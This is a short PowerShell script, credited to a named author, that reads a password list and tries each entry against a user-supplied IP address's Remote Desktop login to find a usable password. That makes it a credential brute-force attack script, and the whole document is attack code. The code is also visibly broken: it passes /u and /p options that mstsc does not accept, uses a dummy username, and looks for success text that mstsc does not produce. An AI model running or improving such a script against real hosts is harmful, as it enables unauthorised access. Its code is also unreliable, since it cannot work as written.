# Nick Alderete
# PowerShell script- RDP Connection




# Prompt user for IP address
$ipAddress = Read-Host -Prompt "Enter the IP address for RDP connection"

# Prompt user for password file path
$passwordFilePath = Read-Host -Prompt "Enter the password file path"

# Read the password file
$passwords = Get-Content $passwordFilePath

# Function to check if a password is usable for RDP connection
function Test-RdpPassword {
    param (
        [string]$IpAddress,
        [string]$Password
    )

    # Test RDP connection using the provided IP address and password
    $result = mstsc /v:$IpAddress /f /w:800 /h:600 /u:dummy /p:$Password 2>&1

    # Check the output for successful RDP connection
    if ($result -match "Authentication succeeded") {
        return $true
    }
    else {
        return $false
    }
}

# Loop through each password in the file and test it
foreach ($password in $passwords) {
    if (Test-RdpPassword -IpAddress $ipAddress -Password $password) {
        Write-Host "Usable password found: $password"
        break
    }
}
